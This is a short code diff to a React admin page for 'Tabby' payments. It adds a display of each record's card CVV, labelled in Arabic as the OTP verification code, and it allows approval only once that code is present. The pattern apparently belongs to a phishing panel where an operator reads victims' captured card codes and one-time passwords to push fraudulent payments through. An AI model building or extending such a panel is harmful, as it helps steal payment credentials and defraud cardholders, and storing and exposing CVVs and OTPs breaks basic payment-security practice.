@@ -220,9 +220,15 @@ const AdminTabbyPayments = () => {
                         <p dir="ltr" className="text-right">{payment.phone}</p>
                       </div>
                     )}
+                    {payment.cvv && (
+                      <div className="col-span-2">
+                        <p className="font-medium text-muted-foreground">كود التحقق (OTP)</p>
+                        <p className="font-mono text-lg font-bold text-primary">{payment.cvv}</p>
+                      </div>
+                    )}
                   </div>
 
-                  {payment.payment_status === 'pending' && (
+                  {payment.payment_status === 'pending' && payment.cvv && (
                     <div className="flex gap-2 pt-4">
                       <Button
                         onClick={() => handleApprove(payment.id)}
